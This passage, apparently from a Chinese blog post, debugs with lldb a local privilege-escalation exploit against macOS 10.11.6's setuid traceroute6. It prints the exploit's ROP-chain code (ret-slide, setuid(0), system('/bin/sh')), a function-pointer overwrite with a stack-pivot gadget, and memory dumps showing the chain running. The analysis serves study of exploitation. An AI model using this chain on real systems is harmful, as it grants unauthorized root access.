<p>因为<code>traceroute6</code>的栈足够长，所以<code>exploit</code>将<code>payload</code>就放在栈上，通过<code>stack_shift_gadget</code>跳到一串连续的<code>ret</code>的<code>gadget</code>处，从而触发提权代码的执行。</p>
<p>在args_u64的<code>ROP</code>栈处理好之后，内存布局如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) memory read -size 8  -format x -c100 args_u64&#10;0x101000000: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000010: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000020: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000030: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000040: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000050: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000060: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000070: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000080: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000090: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x1010000a0: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x1010000b0: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x1010000c0: 0x00007fff8fe520d5 0x00007fff8fe520d5</span><br></pre></td></tr></table></figure>
<p>可以看到<code>0x00007fff8fe520d5</code>就是<code>ret</code>的 <code>gad_get</code>的地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">383</span>   <span class="comment">// ret-slide</span></span><br><span class="line"><span class="number">384</span>   <span class="keyword">int</span> i;</span><br><span class="line"><span class="number">385</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ret_slide_length; i++) &#123;</span><br><span class="line"><span class="number">386</span>     args_u64[i] = ret;</span><br><span class="line"><span class="number">387</span>   &#125;</span><br><span class="line"><span class="number">388</span></span><br><span class="line"><span class="number">389</span>   args_u64[i] = pop_rdi_ret;</span><br><span class="line"><span class="number">390</span>   args_u64[i+<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="number">391</span>   args_u64[i+<span class="number">2</span>] = (<span class="keyword">uint8_t</span>*)&amp;setuid;</span><br><span class="line"><span class="number">392</span>   args_u64[i+<span class="number">3</span>] = pop_rdi_ret;</span><br><span class="line"><span class="number">393</span>   args_u64[i+<span class="number">4</span>] = bin_sh;</span><br><span class="line"><span class="number">394</span>   args_u64[i+<span class="number">5</span>] = (<span class="keyword">uint8_t</span>*)&amp;system;</span><br></pre></td></tr></table></figure>
<p>在执行389-394行之后，最后的<code>stack</code>内存的布局如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) p/x i&#10;(int) $32 = 0x00000102&#10;(lldb) p &#38;args_u64[0x102]&#10;(uint8_t **) $30 = 0x0000000101000810&#10;&#10;(lldb) memory read -size 8 -format x -count 30 0x0000000101000790&#10;0x101000790: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x1010007a0: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x1010007b0: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x1010007c0: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x1010007d0: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x1010007e0: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x1010007f0: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000800: 0x00007fff8fe520d5 0x00007fff8fe520d5&#10;0x101000810: 0x00007fff8fe8a213 0x0000000000000000&#10;0x101000820: 0x00007fff8a183628 0x00007fff8fe8a213&#10;0x101000830: 0x00007fff8fedb69e 0x00007fff8fed0e0b&#10;0x101000840: 0x0000000000000000 0x0000000000000000&#10;0x101000850: 0x0000000000000000 0x0000000000000000&#10;0x101000860: 0x0000000000000000 0x0000000000000000&#10;0x101000870: 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>可以看到<code>0x101000800</code>之前都是用<code>ret</code>的<code>gad_get</code>填充的，从<code>0x101000810</code>开始是伪造的调用栈的结构。大致如下图所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/*			args</span><br><span class="line">   * 		+-------------------+</span><br><span class="line">   * 		|   ret             | +---------+</span><br><span class="line">   * 		+-------------------+           |</span><br><span class="line">   * 		|   ret             |		 0x101个</span><br><span class="line">   * 		+-------------------+           |</span><br><span class="line">   * 		|   ret             | +---------+</span><br><span class="line">   *  		+-------------------+</span><br><span class="line">   * 		|   pop_rdi_ret     |</span><br><span class="line">   * 		+-------------------+</span><br><span class="line">   * 		|   0               |</span><br><span class="line">   * 		+-------------------+</span><br><span class="line">   * 		|   setuid          |</span><br><span class="line">   * 		+-------------------+</span><br><span class="line">   * 		|   pop_rdi_ret     |</span><br><span class="line">   * 		+-------------------+</span><br><span class="line">   * 		|   bin_sh          |</span><br><span class="line">   * 		+-------------------+</span><br><span class="line">   * 		|   system          |</span><br><span class="line">   * 		+-------------------+</span><br><span class="line">   *		</span><br><span class="line">*/</span></span><br></pre></td></tr></table></figure>
<p><code>ROP</code>的逻辑很简单，通过跳转到上面任意一个<code>ret</code>，就会执行setuid(0),并且创建一个具有<code>root</code>权限的<code>shell</code>。通过<code>execve</code>调用<code>traceroute6</code>的时候需要将这一段并到<code>execve</code>的参数上面去。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">398</span>   <span class="keyword">size_t</span> argv_allocation_size = (ret_slide_length+<span class="number">100</span>)*<span class="number">8</span>*<span class="number">8</span>;</span><br><span class="line"><span class="number">399</span>   <span class="keyword">char</span>** target_argv = <span class="built_in">malloc</span>(argv_allocation_size);</span><br><span class="line"><span class="number">400</span>   <span class="built_in">memset</span>(target_argv, <span class="number">0</span>, argv_allocation_size);</span><br><span class="line"><span class="number">401</span>   target_argv[<span class="number">0</span>] = progname;</span><br><span class="line"><span class="number">402</span>   target_argv[<span class="number">1</span>] = optname;</span><br><span class="line"><span class="number">403</span>   target_argv[<span class="number">2</span>] = optval;</span><br><span class="line"><span class="number">404</span>   <span class="keyword">int</span> argn = <span class="number">3</span>;</span><br><span class="line"><span class="number">405</span>   target_argv[argn++] = &amp;args[<span class="number">0</span>];</span><br><span class="line"><span class="number">406</span>   <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; target_argv_rop_size; i++) &#123;</span><br><span class="line"><span class="number">407</span>     <span class="keyword">if</span> (args[i-<span class="number">1</span>] == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">408</span>       target_argv[argn++] = &amp;args[i];</span><br><span class="line"><span class="number">409</span>     &#125;</span><br><span class="line"><span class="number">410</span>   &#125;</span><br><span class="line"><span class="number">411</span>   target_argv[argn] = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
<p>最后<code>target_argv</code>的结构大致如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line">  *  		+-------------------+</span><br><span class="line">  * 		|   progname        |</span><br><span class="line">  * 		+-------------------+</span><br><span class="line">  * 		|   optname         |</span><br><span class="line">  * 		+-------------------+</span><br><span class="line">  * 		|   optval          |</span><br><span class="line">  * 		+-------------------+</span><br><span class="line">  * 		|   &amp;arg[0]         |</span><br><span class="line">  * 		+-------------------+</span><br><span class="line">  * 		|   &amp;arg[1]         |</span><br><span class="line">  * 		+-------------------+</span><br><span class="line">  * 		|   &amp;arg[2]         |</span><br><span class="line">  * 		+-------------------+</span><br><span class="line">  * 		|   ...             |</span><br><span class="line">  * 		+-------------------+</span><br><span class="line">  * 		|   &amp;arg[n]         |</span><br><span class="line">  * 		+-------------------+</span><br><span class="line">  * 		|   NULL            |</span><br><span class="line">  * 		+-------------------+</span><br><span class="line">  */</span></span><br></pre></td></tr></table></figure>
<h2 id="3-2_do_parent">3.2 do_parent</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">598</span>   <span class="comment">//overwrite the fptr value:</span></span><br><span class="line"><span class="number">599</span>   *(<span class="keyword">uint64_t</span>*)(shared_page+fptr_offset) = stack_shift_gadget;</span><br></pre></td></tr></table></figure>
<p><code>do_parent</code>的这一行代码修改了<code>__clean</code>处的地址。</p>
<p>在执行599行之前观察。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(lldb) p/x *(<span class="keyword">uint64_t</span>*)(shared_page+fptr_offset)</span><br><span class="line">(<span class="keyword">uint64_t</span>) $<span class="number">34</span> = <span class="number">0x00007fff8fe8e61d</span></span><br><span class="line">(lldb) dis -s <span class="number">0x00007fff8fe8e61d</span></span><br><span class="line">libsystem_c.dylib`_cleanup:</span><br><span class="line">    <span class="number">0x7fff8fe8e61d</span> &lt;+<span class="number">0</span>&gt;:  push   rbp</span><br><span class="line">    <span class="number">0x7fff8fe8e61e</span> &lt;+<span class="number">1</span>&gt;:  mov    rbp, rsp</span><br><span class="line">    <span class="number">0x7fff8fe8e621</span> &lt;+<span class="number">4</span>&gt;:  mov    rdi, qword ptr [rip - <span class="number">0x1c95c588</span>] ; (<span class="keyword">void</span> *)<span class="number">0x00007fff8fe8d6ce</span>: __sflush</span><br><span class="line">    <span class="number">0x7fff8fe8e628</span> &lt;+<span class="number">11</span>&gt;: pop    rbp</span><br><span class="line">    <span class="number">0x7fff8fe8e629</span> &lt;+<span class="number">12</span>&gt;: jmp    <span class="number">0x7fff8fed6c6c</span>            ; symbol stub <span class="keyword">for</span>: _fwalk</span><br></pre></td></tr></table></figure>
<p>在执行了<code>overwrite</code>之后的内存如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(lldb) p/x *(<span class="keyword">uint64_t</span>*)(shared_page+fptr_offset)</span><br><span class="line">(<span class="keyword">uint64_t</span>) $<span class="number">36</span> = <span class="number">0x00007fff8fed1cec</span></span><br><span class="line">(lldb) dis -s <span class="number">0x00007fff8fed1cec</span></span><br><span class="line">libsystem_c.dylib`realpath$DARWIN_EXTSN:</span><br><span class="line">    <span class="number">0x7fff8fed1cec</span> &lt;+<span class="number">1935</span>&gt;: add    rsp, <span class="number">0x1d88</span></span><br><span class="line">    <span class="number">0x7fff8fed1cf3</span> &lt;+<span class="number">1942</span>&gt;: pop    rbx</span><br><span class="line">    <span class="number">0x7fff8fed1cf4</span> &lt;+<span class="number">1943</span>&gt;: pop    r12</span><br><span class="line">    <span class="number">0x7fff8fed1cf6</span> &lt;+<span class="number">1945</span>&gt;: pop    r13</span><br><span class="line">    <span class="number">0x7fff8fed1cf8</span> &lt;+<span class="number">1947</span>&gt;: pop    r14</span><br><span class="line">    <span class="number">0x7fff8fed1cfa</span> &lt;+<span class="number">1949</span>&gt;: pop    r15</span><br><span class="line">    <span class="number">0x7fff8fed1cfc</span> &lt;+<span class="number">1951</span>&gt;: pop    rbp</span><br><span class="line">    <span class="number">0x7fff8fed1cfd</span> &lt;+<span class="number">1952</span>&gt;: ret</span><br><span class="line">    <span class="number">0x7fff8fed1cfe</span> &lt;+<span class="number">1953</span>&gt;: call   <span class="number">0x7fff8fed5fdc</span>            ; symbol stub <span class="keyword">for</span>: __error</span><br><span class="line">    <span class="number">0x7fff8fed1d03</span> &lt;+<span class="number">1958</span>&gt;: mov    dword ptr [rax], <span class="number">0x3e</span></span><br></pre></td></tr></table></figure>
<h2 id="3-3_traceroute6">3.3 traceroute6</h2><p>要调试<code>execve</code>启动的<code>traceroute6</code>，先通过<code>lldb</code>启动<code>surfacer00t_10_11_6</code>，对<code>fork</code>下断点。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) b fork&#10;Breakpoint 6: where = libsystem_c.dylib`fork, address = 0x00007fff8fe60f70</span><br></pre></td></tr></table></figure>
<p>执行到<code>fork</code>后会停下来。</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">*</span> thread <span class="comment">#1: tid = 0x6e32, 0x00007fff8fe60f70 libsystem_c.dylib`fork, queue = 'com.apple.main-thread', stop reason = breakpoint 6.1</span></span><br><span class="line">    frame <span class="comment">#0: 0x00007fff8fe60f70 libsystem_c.dylib`fork</span></span><br><span class="line">libsystem_c.dylib`fork:</span><br><span class="line">-&gt;  0x7fff8fe60f70 <span class="variable">&lt;+0&gt;</span>: push   rbp</span><br><span class="line">    0x7fff8fe60f71 <span class="variable">&lt;+1&gt;</span>: mov    rbp, rsp</span><br><span class="line">    0x7fff8fe60f74 <span class="variable">&lt;+4&gt;</span>: push   rbx</span><br><span class="line">    0x7fff8fe60f75 <span class="variable">&lt;+5&gt;</span>: push   rax</span><br></pre></td></tr></table></figure>
<p>这个时候启动另外一个<code>lldb</code>进程，这个<code>lldb</code>要用<code>sudo</code>启动，否则会无法<code>attach</code>。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) process attach -name traceroute6 -waitfor</span><br></pre></td></tr></table></figure>
<p>通过这条指令，等待<code>traceroute6</code>执行。同时继续执行<code>fork</code>的<code>lldb</code>。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(lldb) process attach -name traceroute6 -waitfor</span><br><span class="line">There is a running process, detach from it and attach?: [Y/n]</span><br><span class="line">Process 569 detached</span><br><span class="line">Process 580 stopped</span><br><span class="line">* thread #1: tid = 0x7244, 0x00007fff8a182612 libsystem_kernel.dylib`__write_nocancel + 10, queue = 'com.apple.main-thread', stop reason = signal SIGSTOP</span><br><span class="line">    frame #0: 0x00007fff8a182612 libsystem_kernel.dylib`__write_nocancel + 10</span><br><span class="line">libsystem_kernel.dylib`__write_nocancel:</span><br><span class="line">-&gt;  0x7fff8a182612 &lt;+10&gt;: jae    0x7fff8a18261c            ; &lt;+20&gt;</span><br><span class="line">    0x7fff8a182614 &lt;+12&gt;: movq   %rax, %rdi</span><br><span class="line">    0x7fff8a182617 &lt;+15&gt;: jmp    0x7fff8a17c7cd            ; cerror_nocancel</span><br><span class="line">    0x7fff8a18261c &lt;+20&gt;: retq</span><br></pre></td></tr></table></figure>
<p>就可以调试<code>ROP</code>的执行过程。</p>
<p>有一点要注意，除了要<code>sudo</code>启动第二个<code>lldb</code>之外，系统还需要关闭<code>SIP</code>，但是在Parallels Desktop中进入OS X的恢复模式，有点奇特。并不是command+R。</p>
<blockquote>
<h2 id="Information">Information</h2><p>This article describes how to boot into your OS X virtual machine’s Recovery Mode on Parallels Desktop.</p>
<ol>
<li>Start Parallels Desktop but do not start your virtual machine.</li>
<li>Open virtual machine’s <a href="http://kb.parallels.com/5164" target="_blank" rel="external">configuration window</a> -&gt; <strong>Hardware</strong> -&gt; <strong>Boot Order</strong>.</li>
<li>Enable <strong>Select boot device on startup</strong> option and close configuration window.</li>
<li>Start your OS X virtual machine, click on the virtual machine window to make it grab the focus and press any key when prompted:</li>
<li>On the <strong>Boot Manager</strong> window choose <strong>Mac OS X Recovery</strong>:</li>
</ol>
</blockquote>
<p>也可以看<a href="http://kb.parallels.com/cn/116526" target="_blank" rel="external">这里</a>。</p>
<p>通过查看<code>__cleanup</code>处的汇编代码可以看到函数已经被替换了。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) p __cleanup&#10;(void *) $0 = 0x00007fff8fed1cec&#10;(lldb) dis -s __cleanup&#10;libsystem_c.dylib`realpath$DARWIN_EXTSN:&#10;    0x7fff8fed1cec &#60;+1935&#62;: addq   $0x1d88, %rsp             ; imm = 0x1D88&#10;    0x7fff8fed1cf3 &#60;+1942&#62;: popq   %rbx&#10;    0x7fff8fed1cf4 &#60;+1943&#62;: popq   %r12&#10;    0x7fff8fed1cf6 &#60;+1945&#62;: popq   %r13&#10;    0x7fff8fed1cf8 &#60;+1947&#62;: popq   %r14&#10;    0x7fff8fed1cfa &#60;+1949&#62;: popq   %r15&#10;    0x7fff8fed1cfc &#60;+1951&#62;: popq   %rbp&#10;    0x7fff8fed1cfd &#60;+1952&#62;: retq&#10;    0x7fff8fed1cfe &#60;+1953&#62;: callq  0x7fff8fed5fdc            ; symbol stub for: __error&#10;    0x7fff8fed1d03 &#60;+1958&#62;: movl   $0x3e, (%rax)</span><br></pre></td></tr></table></figure>
<p>可以对这里打断点后释放，就会执行到我们的栈上跳转的代码。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(lldb) b *0x00007fff8fed1cec</span><br><span class="line">Breakpoint 1: where = libsystem_c.dylib`realpath$DARWIN_EXTSN + 1935, address = 0x00007fff8fed1cec</span><br><span class="line">(lldb) c</span><br><span class="line">Process 580 resuming</span><br><span class="line">Process 580 stopped</span><br><span class="line">* thread #1: tid = 0x7244, 0x00007fff8fed1cec libsystem_c.dylib`realpath$DARWIN_EXTSN + 1935, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1</span><br><span class="line">    frame #0: 0x00007fff8fed1cec libsystem_c.dylib`realpath$DARWIN_EXTSN + 1935</span><br><span class="line">libsystem_c.dylib`realpath$DARWIN_EXTSN:</span><br><span class="line">-&gt;  0x7fff8fed1cec &lt;+1935&gt;: addq   $0x1d88, %rsp             ; imm = 0x1D88</span><br><span class="line">    0x7fff8fed1cf3 &lt;+1942&gt;: popq   %rbx</span><br><span class="line">    0x7fff8fed1cf4 &lt;+1943&gt;: popq   %r12</span><br><span class="line">    0x7fff8fed1cf6 &lt;+1945&gt;: popq   %r13</span><br></pre></td></tr></table></figure>
<p>观察<code>$rsp</code>寄存器</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">(lldb) <span class="keyword">register</span> read</span><br><span class="line">General Purpose Registers:</span><br><span class="line">       rax = <span class="number">0x00007fff8fed1cec</span>  libsystem_c.dylib`realpath$DARWIN_EXTSN + <span class="number">1935</span></span><br><span class="line">       rbx = <span class="number">0x0000000000000001</span></span><br><span class="line">       rcx = <span class="number">0x0000050000000000</span></span><br><span class="line">       rdx = <span class="number">0x00007fff735360d0</span>  atexit_mutex + <span class="number">32</span></span><br><span class="line">       rdi = <span class="number">0x00007fff735360b0</span>  atexit_mutex</span><br><span class="line">       rsi = <span class="number">0x0000050000000500</span></span><br><span class="line">       rbp = <span class="number">0x00007fff523dcc70</span></span><br><span class="line">       rsp = <span class="number">0x00007fff523dcc58</span></span><br><span class="line">        r8 = <span class="number">0x00000000fffffffc</span></span><br><span class="line">        r9 = <span class="number">0x00007fff735360c8</span>  atexit_mutex + <span class="number">24</span></span><br><span class="line">       r10 = <span class="number">0x00000000ffffffff</span></span><br><span class="line">       r11 = <span class="number">0xffffffff00000000</span></span><br><span class="line">       r12 = <span class="number">0x0000000000000219</span></span><br><span class="line">       r13 = <span class="number">0x000000010d823818</span>  traceroute6`___lldb_unnamed_function1$$traceroute6 + <span class="number">4828</span></span><br><span class="line">       r14 = <span class="number">0x00007fff523dd610</span></span><br><span class="line">       r15 = <span class="number">0x00007fff735372a0</span>  optarg</span><br><span class="line">       rip = <span class="number">0x00007fff8fed1cec</span>  libsystem_c.dylib`realpath$DARWIN_EXTSN + <span class="number">1935</span></span><br><span class="line">    rflags = <span class="number">0x0000000000000202</span></span><br><span class="line">        cs = <span class="number">0x000000000000002b</span></span><br><span class="line">        fs = <span class="number">0x0000000000000000</span></span><br><span class="line">        gs = <span class="number">0x0000000000000000</span></span><br><span class="line">        </span><br><span class="line">(lldb) memory read -size <span class="number">8</span> -format x -count <span class="number">100</span>  <span class="number">0x00007fff523dcc58</span>+<span class="number">0x1d88</span></span><br><span class="line"><span class="number">0x7fff523de9e0</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523de9f0</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea00</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea10</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea20</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea30</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea40</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea50</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea60</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea70</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea80</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dea90</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523deaa0</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line">...</span><br><span class="line"><span class="number">0x7fff523decb0</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523decc0</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523decd0</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523dece0</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br><span class="line"><span class="number">0x7fff523decf0</span>: <span class="number">0x00007fff8fe520d5</span> <span class="number">0x00007fff8fe520d5</span></span><br></pre></td></tr></table></figure>
<p>执行<code>0x7fff8fed1cec</code>处开始的<code>gad_get</code>之后，就会修改<code>rsp</code>,并通过<code>ret</code>指令，跳转到具体的<code>payload</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-&gt;  <span class="number">0x7fff8fed1cec</span> &lt;+<span class="number">1935</span>&gt;: add    rsp, <span class="number">0x1d88</span></span><br><span class="line">    <span class="number">0x7fff8fed1cf3</span> &lt;+<span class="number">1942</span>&gt;: pop    rbx</span><br><span class="line">    <span class="number">0x7fff8fed1cf4</span> &lt;+<span class="number">1943</span>&gt;: pop    r12</span><br><span class="line">    <span class="number">0x7fff8fed1cf6</span> &lt;+<span class="number">1945</span>&gt;: pop    r13</span><br><span class="line">    <span class="number">0x7fff8fed1cf8</span> &lt;+<span class="number">1947</span>&gt;: pop    r14</span><br><span class="line">    <span class="number">0x7fff8fed1cfa</span> &lt;+<span class="number">1949</span>&gt;: pop    r15</span><br><span class="line">    <span class="number">0x7fff8fed1cfc</span> &lt;+<span class="number">1951</span>&gt;: pop    rbp</span><br><span class="line">    <span class="number">0x7fff8fed1cfd</span> &lt;+<span class="number">1952</span>&gt;: ret</span><br></pre></td></tr></table></figure>
<p>执行的流程大致如下</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) n&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fed1cf3 libsystem_c.dylib`realpath$DARWIN_EXTSN + 1942, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fed1cf3 libsystem_c.dylib`realpath$DARWIN_EXTSN + 1942&#10;libsystem_c.dylib`realpath$DARWIN_EXTSN:&#10;-&#62;  0x7fff8fed1cf3 &#60;+1942&#62;: pop    rbx&#10;    0x7fff8fed1cf4 &#60;+1943&#62;: pop    r12&#10;    0x7fff8fed1cf6 &#60;+1945&#62;: pop    r13&#10;    0x7fff8fed1cf8 &#60;+1947&#62;: pop    r14&#10;(lldb)&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fed1cf4 libsystem_c.dylib`realpath$DARWIN_EXTSN + 1943, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fed1cf4 libsystem_c.dylib`realpath$DARWIN_EXTSN + 1943&#10;libsystem_c.dylib`realpath$DARWIN_EXTSN:&#10;-&#62;  0x7fff8fed1cf4 &#60;+1943&#62;: pop    r12&#10;    0x7fff8fed1cf6 &#60;+1945&#62;: pop    r13&#10;    0x7fff8fed1cf8 &#60;+1947&#62;: pop    r14&#10;    0x7fff8fed1cfa &#60;+1949&#62;: pop    r15&#10;(lldb)&#10;Process 580 stopped&#10;* thread #1: tid = 0x7244, 0x00007fff8fed1cf6 libsystem_c.dylib`realpath$DARWIN_EXTSN + 1945, queue = &#39;com.apple.main-thread&#39;, stop reason = instruction step over&#10;    frame #0: 0x00007fff8fed1cf6 libsystem_c.dylib`realpath$DARWIN_EXTSN + 1945&#10;libsystem_c.dylib`realpath$DARWIN_EXTSN:&#10;-&#62;  0x7fff8fed1cf6 &#60;+1945&#62;: pop    r13&#10;    